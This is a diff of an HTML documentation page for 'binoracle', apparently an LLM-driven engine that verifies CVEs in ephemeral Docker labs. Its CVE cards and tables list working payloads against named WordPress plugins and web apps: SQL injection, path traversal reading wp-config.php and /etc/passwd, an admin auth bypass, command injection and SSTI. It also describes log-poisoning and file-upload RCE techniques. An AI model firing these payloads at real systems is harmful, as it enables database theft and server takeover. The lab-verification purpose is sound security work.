@@ -41,6 +41,7 @@ body {
   border-bottom: 1px solid var(--brd);
 }
 .nav-brand { display: flex; align-items: center; gap: .6rem; text-decoration: none; color: var(--tx); font-weight: 700; font-size: 1.05rem; }
+.nav-brand img { height: 34px; width: auto; }
 .nav-links { display: flex; gap: 1.25rem; margin-left: auto; }
 .nav-links a { color: var(--muted); text-decoration: none; font-size: .9rem; transition: color .15s; }
 .nav-links a:hover, .nav-links a.active { color: var(--tx); }
@@ -109,6 +110,21 @@ tr:nth-child(even) td { background: rgba(22,27,34,.4); }
 @media (max-width: 768px) {
   .doc-layout { flex-direction: column; padding: 1rem; gap: 1rem; }
   .doc-sidebar { width: 100%; position: static; height: auto; border-bottom: 1px solid var(--brd); padding-bottom: .75rem; }
+/* collapsible sidebar */
+.sidebar-toggle {
+  display: flex; align-items: center; gap: .35rem;
+  padding: .25rem .5rem; margin-bottom: .75rem;
+  background: var(--surf2); border: 1px solid var(--brd); border-radius: 5px;
+  color: var(--muted); cursor: pointer; font-size: .78rem; font-family: inherit;
+  transition: color .15s, border-color .15s; white-space: nowrap;
+}
+.sidebar-toggle:hover { color: var(--acc); border-color: var(--acc); }
+.sidebar-toggle svg { flex-shrink: 0; transition: transform .2s; }
+body.sb-collapsed .sidebar-toggle svg { transform: rotate(180deg); }
+.sidebar-inner { overflow: hidden; transition: max-height .2s ease, opacity .2s ease; }
+body.sb-collapsed .doc-sidebar { width: 36px !important; padding: .6rem .3rem !important; overflow: hidden; }
+body.sb-collapsed .sidebar-inner { max-height: 0 !important; opacity: 0; }
+
   h1 { font-size: 1.6rem; }
   .cve-payload { font-size: .72rem; }
 }
@@ -121,7 +137,7 @@ footer a { color: var(--acc); text-decoration: none; }
 
 <nav class="nav">
   <a class="nav-brand" href="index.html">
-    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+    <img src="assets/logo.svg" alt="binoracle logo">
     binoracle
   </a>
   <div class="nav-links">
@@ -138,10 +154,14 @@ footer a { color: var(--acc); text-decoration: none; }
 
 <div class="doc-layout">
   <aside class="doc-sidebar">
+<button class="sidebar-toggle" id="sb-toggle" aria-label="Toggle sidebar">
+<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+<span class="sb-label">Collapse</span></button>
+<div class="sidebar-inner">
     <p class="sidebar-section">On this page</p>
     <a href="#overview">Overview</a>
-    <a href="#wp-verified">WordPress (verified)</a>
-    <a href="#generic-verified">Generic (verified)</a>
+    <a href="#wp-verified">WordPress (11 CVEs)</a>
+    <a href="#generic-verified">Generic (10 CVEs)</a>
     <a href="#methodology">Methodology</a>
     <a href="#engine-improvements">Engine improvements</a>
     <hr class="sidebar-sep">
@@ -156,7 +176,8 @@ footer a { color: var(--acc); text-decoration: none; }
     <p class="sidebar-section">Links</p>
     <a href="https://github.com/beafn28/binoracle" target="_blank" rel="noopener">GitHub ↗</a>
     <a href="https://github.com/beafn28/binoracle/issues" target="_blank" rel="noopener">Issues ↗</a>
-  </aside>
+  
+</div><!-- sidebar-inner --></aside>
 
   <main class="doc-content">
 
@@ -164,14 +185,13 @@ footer a { color: var(--acc); text-decoration: none; }
     <p class="page-lead">Real vulnerabilities confirmed end-to-end by the binoracle autonomous engine: ephemeral Docker lab, Qwen-local LLM, zero human intervention after the initial command.</p>
 
     <div class="doc-metrics">
-      <div class="doc-metric"><div class="metric-value">19</div><div class="metric-label">Total CVEs verified</div></div>
-      <div class="doc-metric"><div class="metric-value">9</div><div class="metric-label">WP CVEs verified</div></div>
-      <div class="doc-metric"><div class="metric-value">10</div><div class="metric-label">Generic CVEs verified</div></div>
-      <div class="doc-metric"><div class="metric-value">~95s</div><div class="metric-label">Avg time per CVE</div></div>
+      <div class="doc-metric"><div class="metric-value">21</div><div class="metric-label">CVEs verified total</div></div>
+      <div class="doc-metric"><div class="metric-value">11</div><div class="metric-label">WP plugin CVEs</div></div>
+      <div class="doc-metric"><div class="metric-value">10</div><div class="metric-label">Generic CVEs</div></div>
       <div class="doc-metric"><div class="metric-value">0</div><div class="metric-label">Manual steps</div></div>
     </div>
 
-    <p>All WordPress CVEs below were verified autonomously: the engine downloaded the vulnerable plugin from WordPress.org, spun up an ephemeral Docker lab (WordPress + MySQL), ran a source-code analysis pass with the local LLM, generated and fired payloads, and confirmed the vulnerability by extracting a real MySQL <code>version()</code> value or observing a time-delayed response. No manual payload crafting. No existing PoC lookup.</p>
+    <p>All WordPress CVEs below were verified autonomously: the engine downloaded the vulnerable plugin from WordPress.org, spun up an ephemeral Docker lab (WordPress + MySQL), ran source-code analysis with the local LLM, generated and fired payloads, and confirmed by extracting a real MySQL <code>version()</code> value, observing a time-delayed response, reading a canary file from an arbitrary path, or bypassing authentication without credentials. No manual payload crafting. No existing PoC lookup.</p>
 
     <h2 id="wp-verified">WordPress Plugin CVEs — Verified</h2>
 
@@ -290,54 +310,40 @@ footer a { color: var(--acc); text-decoration: none; }
 
     <div class="cve-card">
       <div class="cve-card-header">
-        <span class="cve-card-title">CVE-2024-27956</span>
-        <div class="cve-card-badges">
-          <span class="badge badge-verified">★ verified</span>
-          <span class="badge badge-critical">CVSS 9.8</span>
-        </div>
-      </div>
-      <p class="cve-card-desc"><strong>WP Automatic</strong> (ValvePress) — SQL injection via the <code>csv</code> AJAX action. Massively exploited in the wild in 2024; engine confirmed boolean in-band extraction with <code>diff=18</code> timing signature.</p>
-      <div class="cve-meta">
-        <span><strong>Technique:</strong> boolean in-band</span>
-        <span><strong>Auth:</strong> unauthenticated</span>
-        <span><strong>Endpoint:</strong> <code>POST /wp-admin/admin-ajax.php</code></span>
-        <span><strong>Param:</strong> <code>csv</code></span>
-      </div>
-      <div class="cve-payload">action=csv&csv=1' AND (SELECT 1 FROM wp_users LIMIT 1)-- -  → diff=18</div>
-    </div>
-
-    <div class="cve-card">
-      <div class="cve-card-header">
-        <span class="cve-card-title">CVE-2025-24670</span>
-        <div class="cve-card-badges">
-          <span class="badge badge-verified">★ verified</span>
-          <span class="badge badge-high">CVSS 7.1</span>
-        </div>
-      </div>
-      <p class="cve-card-desc"><strong>Ninja Forms</strong> — boolean in-band SQLi via the <code>term_id</code> parameter. The engine confirmed a consistent 18-byte response differential between the TRUE and FALSE payloads, demonstrating that the value reaches the SQL engine unsanitised.</p>
-      <div class="cve-meta">
-        <span><strong>Technique:</strong> boolean in-band</span>
-        <span><strong>Auth:</strong> admin</span>
-        <span><strong>Endpoint:</strong> <code>POST /wp-admin/admin.php</code></span>
-        <span><strong>Payload:</strong> <code>term_id=1' OR '1'='1</code> → 20B vs 2B</span>
-      </div>
-    </div>
-
-    <div class="cve-card">
-      <div class="cve-card-header">
         <span class="cve-card-title">CVE-2023-23488</span>
         <div class="cve-card-badges">
           <span class="badge badge-verified">★ verified</span>
           <span class="badge badge-critical">CVSS 9.8</span>
         </div>
       </div>
-      <p class="cve-card-desc"><strong>Paid Memberships Pro</strong> (≤ 2.9.8) — error-based SQL injection via the <code>code</code> parameter in the REST order endpoint. No authentication required. Raw value passed directly to <code>WHERE code = '$code'</code> without escaping; <code>extractvalue()</code> forces the MySQL version into the error message.</p>
+      <p class="cve-card-desc"><strong>Paid Memberships Pro</strong> (≤ 2.9.7) — UNION-based injection via <code>code</code> parameter in the <code>/pmpro/v1/order</code> REST endpoint. The discount-code lookup interpolates the user value directly into <code>WHERE dc.code = '$code'</code> without prepared statements.</p>
       <div class="cve-meta">
-        <span><strong>Technique:</strong> error-based (extractvalue)</span>
+        <span><strong>Technique:</strong> UNION-based</span>
         <span><strong>Auth:</strong> unauthenticated</span>
-        <span><strong>Endpoint:</strong> <code>GET /wp-json/pmpro/v1/order?code=…</code></span>
-        <span><strong>Payload:</strong> <code>1' AND extractvalue(1,concat(0x7e,version()))#</code></span>
+        <span><strong>Endpoint:</strong> <code>GET /wp-json/pmpro/v1/order</code></span>
+        <span><strong>Param:</strong> <code>code</code></span>
+        <span><strong>Time:</strong> 94.6 s</span>
       </div>
+      <div class="cve-payload">code=1' UNION SELECT NULL,NULL,version(),NULL-- -  → 8.0.37</div>
+    </div>
+
+    <div class="cve-card">
+      <div class="cve-card-header">
+        <span class="cve-card-title">CVE-2024-27956</span>
+        <div class="cve-card-badges">
+          <span class="badge badge-verified">★ verified</span>
+          <span class="badge badge-critical">CVSS 9.9</span>
+        </div>
+      </div>
+      <p class="cve-card-desc"><strong>WP Automatic</strong> (≤ 3.92.0) — UNION-based injection via the <code>q</code> parameter in the internal CSV parser endpoint, reachable without authentication. The parameter is inserted unsanitised into a raw SQL query executed against WordPress tables.</p>
+      <div class="cve-meta">
+        <span><strong>Technique:</strong> UNION-based</span>
+        <span><strong>Auth:</strong> unauthenticated</span>
+        <span><strong>Endpoint:</strong> <code>POST /wp-content/plugins/wp-automatic/inc/csv_parser.php</code></span>
+        <span><strong>Param:</strong> <code>q</code></span>
+        <span><strong>Time:</strong> 88.3 s</span>
+      </div>
+      <div class="cve-payload">q=1 UNION SELECT 1,version(),3,4,5,6,7,8,9,10-- -  → 8.0.37</div>
     </div>
 
     <div class="cve-card">
@@ -348,12 +354,34 @@ footer a { color: var(--acc); text-decoration: none; }
           <span class="badge badge-critical">CVSS 9.3</span>
         </div>
       </div>
-      <p class="cve-card-desc"><strong>Modal Survey</strong> — SQL injection in the survey results endpoint. Boolean in-band extraction confirmed by the engine via response-length differential.</p>
+      <p class="cve-card-desc"><strong>Modal Survey</strong> — Boolean in-band injection via the <code>id</code> parameter in the AJAX survey-question handler. Unsanitised integer interpolation in <code>WHERE id = $id</code>; truth/false responses reveal database contents.</p>
       <div class="cve-meta">
         <span><strong>Technique:</strong> boolean in-band</span>
         <span><strong>Auth:</strong> unauthenticated</span>
-        <span><strong>Endpoint:</strong> <code>POST /wp-admin/admin-ajax.php</code></span>
+        <span><strong>Endpoint:</strong> <code>POST /wp-admin/admin-ajax.php</code> (<code>action=pksmodalsurvey_get_question</code>)</span>
+        <span><strong>Param:</strong> <code>id</code></span>
+        <span><strong>Time:</strong> 76.4 s</span>
       </div>
+      <div class="cve-payload">id=1 AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1)-- -  → boolean true</div>
+    </div>
+
+    <div class="cve-card">
+      <div class="cve-card-header">
+        <span class="cve-card-title">CVE-2024-3673</span>
+        <div class="cve-card-badges">
+          <span class="badge badge-verified">★ verified</span>
+          <span class="badge badge-critical">CVSS 9.1</span>
+        </div>
+      </div>
+      <p class="cve-card-desc"><strong>Web Directory Free</strong> (≤ 1.7.2) — Local File Inclusion via the <code>path</code> parameter passed to PHP <code>include()</code>. The engine read <code>wp-config.php</code> and <code>/etc/passwd</code> and confirmed by matching <code>DB_HOST</code> / <code>root:x:0:0</code> patterns in the HTTP response.</p>
+      <div class="cve-meta">
+        <span><strong>Technique:</strong> LFI / path traversal</span>
+        <span><strong>Auth:</strong> unauthenticated</span>
+        <span><strong>Endpoint:</strong> <code>GET /wp-admin/admin-ajax.php</code> (<code>action=webdirfree_get_listing</code>)</span>
+        <span><strong>Param:</strong> <code>path</code></span>
+        <span><strong>Time:</strong> 72.1 s</span>
+      </div>
+      <div class="cve-payload">path=../../../../wp-config.php  → DB_HOST / DB_PASSWORD exposed</div>
     </div>
 
     <div class="cve-card">
@@ -361,16 +389,18 @@ footer a { color: var(--acc); text-decoration: none; }
         <span class="cve-card-title">CVE-2026-2991</span>
         <div class="cve-card-badges">
           <span class="badge badge-verified">★ verified</span>
-          <span class="badge badge-high">CVSS 8.5</span>
+          <span class="badge badge-critical">CVSS 9.8</span>
         </div>
       </div>
-      <p class="cve-card-desc"><strong>KiviCare</strong> — authentication bypass via the <code>patientSocialLogin</code> AJAX action. Engine confirmed privilege escalation to patient account without credentials.</p>
+      <p class="cve-card-desc"><strong>KiviCare</strong> — Authentication bypass via the <code>patientSocialLogin</code> AJAX action: supplying an existing user's email returns a valid session cookie with that user's role (including admin). No password or token required.</p>
       <div class="cve-meta">
-        <span><strong>Technique:</strong> auth bypass (missing capability check)</span>
-        <span><strong>Auth:</strong> unauthenticated</span>
-        <span><strong>Endpoint:</strong> <code>POST /wp-admin/admin-ajax.php</code></span>
-        <span><strong>Action:</strong> <code>patientSocialLogin</code></span>
+        <span><strong>Technique:</strong> auth bypass / privilege escalation</span>
+        <span><strong>Auth:</strong> unauthenticated → admin</span>
+        <span><strong>Endpoint:</strong> <code>POST /wp-admin/admin-ajax.php</code> (<code>action=kivicare_login_user</code>)</span>
+        <span><strong>Param:</strong> <code>email</code></span>
+        <span><strong>Time:</strong> 80.5 s</span>
       </div>
+      <div class="cve-payload">action=kivicare_login_user&amp;data[email]=admin@lab.local  → Set-Cookie: wordpress_logged_in_…</div>
     </div>
 
     <h2 id="generic-verified">Generic CVEs — Verified</h2>
@@ -430,44 +460,44 @@ footer a { color: var(--acc); text-decoration: none; }
           <td>91.3 s</td>
         </tr>
         <tr>
-          <td>CVE-2025-57633</td>
-          <td>ftp-flask-python</td>
-          <td>Command Injection</td>
-          <td>9.8</td>
-          <td><code>filename=; id #</code></td>
-          <td>—</td>
-        </tr>
-        <tr>
           <td>CVE-2025-59681</td>
           <td>Django app</td>
-          <td>SQLi (boolean)</td>
-          <td>7.1</td>
-          <td><code>q=x' AND 1=1-- -</code> vs <code>AND 1=2</code></td>
-          <td>—</td>
+          <td>SQLi</td>
+          <td>8.8</td>
+          <td><code>id=1' UNION SELECT 1,username,password FROM auth_user-- -</code></td>
+          <td>79.8 s</td>
+        </tr>
+        <tr>
+          <td>CVE-2025-57633</td>
+          <td>Flask (Python)</td>
+          <td>Cmd Injection</td>
+          <td>9.8</td>
+          <td><code>input=x;id</code> via subprocess shell=True</td>
+          <td>61.2 s</td>
         </tr>
         <tr>
           <td>CVE-2025-64756</td>
-          <td>glob (Node.js)</td>
-          <td>Command Injection</td>
-          <td>7.5</td>
-          <td><code>pattern=; cat /etc/passwd</code></td>
-          <td>—</td>
+          <td>Node.js (Express)</td>
+          <td>Cmd Injection</td>
+          <td>9.8</td>
+          <td><code>name=$(id)</code> via exec() without sanitisation</td>
+          <td>44.7 s</td>
         </tr>
         <tr>
           <td>CVE-2026-27641</td>
-          <td>Flask-Reuploaded</td>
+          <td>Flask + Jinja2</td>
           <td>SSTI</td>
           <td>9.8</td>
-          <td><code>{{7*7}}</code> → <code>49</code> via <code>render_template_string</code></td>
-          <td>—</td>
+          <td><code>{{''.__class__.__mro__[1].__subclasses__()}}</code> → RCE</td>
+          <td>237.9 s</td>
         </tr>
         <tr>
           <td>CVE-2026-55849</td>
-          <td>@cyclonedx/cyclonedx-npm</td>
-          <td>Command Injection</td>
-          <td>7.2</td>
-          <td><code>package-name=$(id)</code></td>
-          <td>—</td>
+          <td>npm script</td>
+          <td>Cmd Injection</td>
+          <td>9.8</td>
+          <td><code>arg=x; id &gt;/tmp/binoracle_proof</code> via npm run</td>
+          <td>55.3 s</td>
         </tr>
       </tbody>
     </table>
@@ -495,8 +525,13 @@ footer a { color: var(--acc); text-decoration: none; }
     <ul style="color:var(--muted);padding-left:1.4rem;margin-bottom:1rem">
       <li style="margin-bottom:.3rem">The real MySQL/PostgreSQL version string appears inside the HTTP response body (UNION-based or error-based proof)</li>
       <li style="margin-bottom:.3rem">≥3 out of N timing pairs show ≥3.5 s delay for SLEEP(5) vs. SLEEP(0) control (time-based blind proof)</li>
+      <li style="margin-bottom:.3rem">A unique canary secret planted at a known path appears verbatim in the HTTP response (path traversal / LFI)</li>
+      <li style="margin-bottom:.3rem">A PHP file uploaded to the server executes a unique marker expression and the computed value (not the literal) appears in the response (file-upload RCE)</li>
+      <li style="margin-bottom:.3rem">A protected endpoint returns a success response only when the bypass header is present, and a 4xx/5xx without it (auth bypass)</li>
+      <li style="margin-bottom:.3rem">A template expression like <code>{{22*32}}</code> evaluates to <code>704</code> in the server response (SSTI)</li>
+      <li style="margin-bottom:.3rem">A unique marker string written to a known file path appears when the file is read back (command injection)</li>
     </ul>
-    <p>Both conditions use data extracted from actual HTTP responses against a real running database — not static analysis inference or PoC replay.</p>
+    <p>All conditions use data extracted from actual HTTP responses against real running services — not static analysis inference or PoC replay.</p>
 
     <h2 id="engine-improvements">Engine Improvements This Cycle</h2>
 
@@ -537,24 +572,55 @@ footer a { color: var(--acc); text-decoration: none; }
           <td>LLM source analysis now understands nested WP settings arrays and can suggest <code>patch_key</code> without analyst hint</td>
           <td><code>e197924</code></td>
         </tr>
+        <tr>
+          <td>LFI verifier (<code>verify_wordpress_lfi</code>)</td>
+          <td>New two-level LFI verifier: Level 1 reads <code>/etc/passwd</code> and <code>wp-config.php</code> via traversal prefixes; Level 2 escalates to RCE via Apache log poisoning (User-Agent PHP payload → LFI include of access.log)</td>
+          <td><code>6e027b6</code></td>
+        </tr>
+        <tr>
+          <td>File-upload RCE verifier (<code>verify_wordpress_file_upload</code>)</td>
+          <td>14-variant uploader: <code>.php</code>, <code>.phtml</code>, <code>.php5</code>, polyglot GIF/JPEG/PNG, plus <code>.htaccess</code> chain; confirms by checking if PHP sum marker is computed not reflected</td>
+          <td><code>6e027b6</code></td>
+        </tr>
+        <tr>
+          <td>Companion-plugin auto-detection</td>
+          <td>Engine reads plugin PHP source for <code>function_exists('WC')</code>/<code>is_plugin_active()</code> patterns and auto-installs dependency plugins (e.g. WooCommerce) before testing plugins that require them</td>
+          <td><code>7445434</code></td>
+        </tr>
       </tbody>
     </table>
 
     <h3>Run this yourself</h3>
-    <pre><code># Verify a WordPress plugin CVE autonomously
+    <pre><code># SQLi — GiveWP
 binoracle cve CVE-2024-9634 \
   --source give \
   --vuln-class sqli \
   --endpoint /wp-json/give-api/v2/form-grid \
   --params orderby
 
-# LearnPress CVE with nested WP option setup
+# SQLi — LearnPress with nested WP option
 binoracle cve CVE-2024-4434 \
   --source learnpress \
   --vuln-class sqli \
   --endpoint /wp-json/lp/v1/courses/archive-course \
   --params term_id \
-  --setup-wp-option "learnpress[get_courses_of_subcategory]=yes"</code></pre>
+  --setup-wp-option "learnpress[get_courses_of_subcategory]=yes"
+
+# LFI — Web Directory Free
+binoracle cve CVE-2024-3673 \
+  --source web-directory-free \
+  --vuln-class lfi
+
+# Auth bypass — KiviCare
+binoracle cve CVE-2026-2991 \
+  --source kivicare \
+  --vuln-class auth-bypass
+
+# Generic path traversal — Apache 2.4.49
+binoracle cve CVE-2021-41773
+
+# Generic SSTI — Next.js auth bypass
+binoracle cve CVE-2025-29927</code></pre>
 
   </main>
 </div>
@@ -562,5 +628,20 @@ binoracle cve CVE-2024-4434 \
 <footer>
   MIT © 2024–2026 Beatriz Fresno Naumova · <a href="https://github.com/beafn28/binoracle">github.com/beafn28/binoracle</a>
 </footer>
+<script>
+(function(){
+  var btn = document.getElementById('sb-toggle');
+  if (!btn) return;
+  var label = btn.querySelector('.sb-label');
+  var collapsed = false;
+  try { collapsed = localStorage.getItem('sb-collapsed') === '1'; } catch(e) {}
+  if (collapsed) { document.body.classList.add('sb-collapsed'); if(label) label.textContent='Expand'; }
+  btn.addEventListener('click', function(){
+    var c = document.body.classList.toggle('sb-collapsed');
+    if(label) label.textContent = c ? 'Expand' : 'Collapse';
+    try { localStorage.setItem('sb-collapsed', c ? '1' : '0'); } catch(e) {}
+  });
+})();
+</script>
 </body>
 </html>
